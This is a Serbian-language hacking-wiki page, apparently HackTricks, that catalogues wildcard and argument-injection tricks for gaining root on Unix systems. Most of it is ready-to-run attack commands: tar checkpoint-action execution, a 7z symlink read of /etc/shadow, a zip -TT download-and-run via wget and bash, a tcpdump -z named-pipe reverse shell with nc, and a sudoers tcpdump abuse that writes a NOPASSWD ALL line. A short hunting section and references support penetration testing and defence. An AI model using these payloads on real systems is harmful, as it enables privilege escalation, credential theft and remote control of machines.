# Rezervni trikovi sa Wildcards

> Do **argument injection** pomoću Wildcard-a (poznatog i kao *glob*) dolazi kada privilegovana skripta pokrene Unix binary, kao što su `tar`, `chown`, `rsync`, `zip`, `7z`, …, sa wildcard-om bez navodnika, kao što je `*`.
> Pošto shell proširuje wildcard **pre** izvršavanja binary-ja, attacker koji može da kreira datoteke u radnom direktorijumu može da napravi nazive datoteka koji počinju znakom `-`, zbog čega se oni tumače kao **opcije umesto podataka**, čime se praktično ubacuju proizvoljni flag-ovi ili čak komande.<sup>[[6]](#references)</sup>
> Ova stranica prikuplja najkorisnije primitive, novija istraživanja i moderne detekcije za period 2023–2025.

## chown / chmod

Možete **kopirati vlasnika/grupu ili bitove dozvola iz referentne datoteke** zloupotrebom opcije `--reference`, kada se naziv datoteke koji izgleda kao opcija proširi pomoću wildcard-a.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Prošireni `--reference=.drf.php` nadjačava eksplicitnog vlasnika/režim, zbog čega datoteke koje se podudaraju nasleđuju metapodatke iz `.drf.php` (i, uz gore navedeno podešavanje, postaju upisive za napadača).<sup>[[6]](#references)</sup>

*PoC i alat*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinovani napad).<sup>[[7]](#references)</sup>
Pogledajte i klasični DefenseCode rad za detalje.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Izvršite proizvoljne komande zloupotrebom GNU tar **checkpoint** funkcije i checkpoint akcija.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.<sup>[[10]](#references)</sup>

### Napomena o bsdtar / macOS compressor override

Podrazumevani `tar` u novijim verzijama macOS-a (zasnovan na `libarchive`) ne pruža interfejs `--checkpoint` iz GNU tar-a, ali bsdtar dokumentuje **--use-compress-program** za izbor eksternog compressor-a.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Kada privilegovana skripta pokrene `tar -cf backup.tar *`, ovo kroz `PATH` žrtve bira `sh`, a bsdtar ga pokreće kao compressor.<sup>[[11]](#references)</sup> Ovo dokazuje option injection, ali samo po sebi nije pouzdan arbitrary-command primitive: naziv fajla kreiran pomoću wildcard-a ne može sadržati `/`, a bsdtar prosleđuje podatke arhive umesto shell komande koju napadač bira. Izvršavanje koda dodatno zahteva executable koji se može kontrolisati i koji se razrešava kroz `PATH`, ili drugi argument channel kojim se može navesti koristan program.

---

## rsync

`rsync` omogućava da zamenite remote shell ili remote binary pomoću flagova komandne linije, kao što su `-e` i `--rsync-path`.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum pomoću `rsync -az * backup:/srv/`, ubačena zastavica može pokrenuti shell kroz mehanizam remote-shell.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovana skripta *defanzivno* dodaje `--` ispred wildcard-a (kako bi sprečila parsiranje opcija), 7-Zip CLI prihvata **file list files** tako što se ispred imena datoteke doda `@`. Kombinovanje toga sa symlink-om omogućava vam da *exfiltrate-ujete proizvoljne datoteke*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i prekinuće rad, **ispisujući sadržaj na stderr**.<sup>[[13]](#references)</sup>

Ovo funkcioniše i sa `-- *` zato što 7-Zip CLI eksplicitno prihvata i obična imena fajlova i `@listfiles` kao pozicione inpute, pa se literalno ime fajla kao što je `@root.txt` i dalje posebno obrađuje.<sup>[[13]](#references)</sup>

---

## zip

Postoje dve veoma praktične primitive kada aplikacija prosleđuje imena fajlova pod kontrolom korisnika programu `zip` (bilo preko wildcard-a ili nabrajanjem imena bez `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE putem test hook-a: `-T` omogućava „test archive“, a `-TT <cmd>` zamenjuje tester proizvoljnim programom (duga forma: `--unzip-command <cmd>`). Ako možete da ubacite imena fajlova koja počinju znakom `-`, podelite flagove kroz različita imena fajlova kako bi parsiranje short options funkcionisalo.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Beleške
- Nemojte pokušavati sa jednim nazivom datoteke kao što je `'-T -TT <cmd>'` — kratke opcije se analiziraju znak po znak i neće raditi. Koristite odvojene tokene kao što je prikazano.<sup>[[3]](#references)</sup>
- Ako aplikacija ukloni kose crte iz naziva datoteka, preuzmite sadržaj sa samog hosta/IP adrese (podrazumevana putanja je `/index.html`) i sačuvajte ga lokalno pomoću `-O`, a zatim ga izvršite.<sup>[[3]](#references)</sup>
- Možete otklanjati greške u analizi pomoću `-sc` (prikazuje obrađeni argv) ili `-h2` (dodatna pomoć) da biste razumeli kako se vaši tokeni obrađuju.<sup>[[3]](#references)</sup>

Primer (lokalno ponašanje u zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ako web sloj prosleđuje `zip` stdout/stderr (što je uobičajeno kod naivnih wrappera), ubačene zastavice poput `--help` ili greške zbog neispravnih opcija pojaviće se u HTTP odgovoru, potvrđujući command-line injection i olakšavajući podešavanje payload-a.<sup>[[3]](#references)</sup>

---

## Dodatni kandidati za option-injection

Kada privilegovani wrapper proširuje direktorijum sa dozvolom za upis pomoću wildcard-a, vredi proveriti sledeće dokumentovane option hooks.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Prosleđuje command string shell-u |
| `git`   | `-c core.sshCommand=<cmd>` | Koristi `<cmd>` umesto SSH-a za Git fetch/push |
| `scp`   | `-S <program>` | Koristi alternativni SSH-kompatibilni connection program |

Ovi primitives su korisni za proveru pored klasičnih *tar/rsync/zip* slučajeva.

---

## Pronalaženje ranjivih wrappera i jobova

Nedavne studije slučaja i smernice za detekciju pokazuju da wildcard/argv injection više nije samo problem **cron + tar**.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Ista klasa greške se i dalje pojavljuje u:

- web funkcijama koje „preuzimaju sve kao zip/tar“ iz direktorijuma za upload pod kontrolom napadača
- vendor/appliance debug shellovima koji izlažu **tcpdump** wrapper sa poljima za filename/filter pod kontrolom napadača
- backup ili rotation jobovima koji pozivaju `tar`, `rsync`, `7z`, `zip`, `chown` ili `chmod` nad direktorijumima sa dozvolom za upis

Korisne triage komande (poziv `pspy` koristi dokumentovane process/file-event i interval zastavice).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Brze heuristike:

- `-- *` je dobro rešenje za mnoge GNU alate, ali **ne** i za `7z`/`7za`, zato što se `@listfiles` parsiraju zasebno.<sup>[[13]](#references)</sup>
- Za `zip`, potražite wrappers koji direktno nabrajaju imena fajlova pod kontrolom korisnika; razdvajanje kratkih opcija (`-T` + `-TT <cmd>`) i dalje funkcioniše čak i bez shell glob-a.<sup>[[2]](#references)[[3]](#references)</sup>
- Za `tcpdump` obratite posebnu pažnju na wrappers koji vam omogućavaju kontrolu **imena izlaznih fajlova**, **podešavanja rotacije** ili argumenata za **reprodukciju capture fajla**.<sup>[[18]](#references)</sup>

---

## tcpdump hooks za rotaciju (-G/-W/-z): RCE putem ubacivanja u argv u wrappers

Kada restricted shell ili vendor wrapper sastavlja komandnu liniju za `tcpdump` konkatenacijom polja pod kontrolom korisnika (npr. parametra „ime fajla“) bez stroge validacije/quoting-a, možete ubaciti dodatne `tcpdump` flagove. Kombinacija opcija `-G` (rotacija zasnovana na vremenu), `-W` (ograničava broj fajlova) i `-z <cmd>` (komanda nakon rotacije) omogućava proizvoljno izvršavanje komandi kao korisnik koji pokreće tcpdump (često root na appliance uređajima).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Preduslovi:

- Možete uticati na `argv` koji se prosleđuje programu `tcpdump` (npr. putem wrapper-a kao što je `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Wrapper ne sanitizuje razmake niti tokene sa prefiksom `-` u polju za ime fajla.<sup>[[4]](#references)</sup>

Klasični PoC (izvršava reverse shell skriptu iz putanje u koju je moguće upisivati).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Detalji:

- `-G 1` rotira svake sekunde, a `-W 1` se zaustavlja nakon jedne rotirane datoteke; capture mora da primi odgovarajući packet pre rotacije.<sup>[[18]](#references)</sup>
- `-z <cmd>` pokreće post-rotate command jednom po rotaciji i prosleđuje putanju zatvorenog savefile-a kao argument; uverite se da rukovanje argumentima u script-u/interpreter-u odgovara vašem payload-u.<sup>[[18]](#references)</sup>

Varijante bez removable media:

- Ako imate bilo koji drugi primitive za upisivanje datoteka (npr. poseban command wrapper koji omogućava output redirection), smestite svoj script na poznatu putanju i pokrenite `-z /path/script.sh`; neka script po potrebi sam pozove `/bin/sh`.<sup>[[18]](#references)</sup>
- Ako vendor wrapper omogućava izbor rotirane putanje, proverite kontrolu te putanje samo u kombinaciji sa post-rotate command-om koji interpretira njegov savefile argument; sama kontrola putanje ne izvršava sadržaj datoteke.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump sa wildcards/additional args → proizvoljni write/read i root

Primer anti-pattern-a u sudoers-u:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Pravilo ostavlja nekoliko dostupnih opcija u okviru dokumentovanog tcpdump parsera:<sup>[[3]](#references)[[18]](#references)</sup>
- Glob `*` i permisivni obrasci ograničavaju samo prvi `-w` argument. `tcpdump` prihvata više `-w` opcija; poslednja ima prednost.<sup>[[3]](#references)[[18]](#references)</sup>
- Pravilo ne ograničava druge opcije, pa su `-Z`, `-r`, `-V` itd. dozvoljeni.<sup>[[3]](#references)[[18]](#references)</sup>

Relevantni primitives su dokumentovani u nastavku.<sup>[[3]](#references)[[18]](#references)</sup>
- Zamenite odredišnu putanju drugim `-w` (prvi samo zadovoljava sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal unutar prvog `-w` za izlazak iz ograničenog stabla.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Prisilite vlasništvo izlaznih datoteka pomoću `-Z root` (kreira datoteke u vlasništvu root korisnika bilo gde).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Upis proizvoljnog sadržaja ponovnim reprodukovanjem kreiranog PCAP-a putem `-r` (npr. za ubacivanje linije u sudoers).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Kreirajte PCAP koji sadrži tačan ASCII payload i upišite ga kao root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Čitanje proizvoljnih datoteka/curenje tajni pomoću `-V <file>` (tumači listu savefiles). Dijagnostika grešaka često ispisuje redove, čime se sadržaj odaje.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Potpuni Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Detektovan potencijalni Shell putem Wildcard Injection-a](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Povratak u budućnost: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils `chown` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils `chmod` invocation](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU tar kontrolne tačke](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1) priručnik](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1) priručnik](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Sintaksa komandne linije za 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1) priručnik](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentacija Git konfiguracije](https://git-scm.com/docs/git-config)
- [17] [OpenBSD `scp` priručnik](https://man.openbsd.org/scp)
- [18] [tcpdump(8) priručnik](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
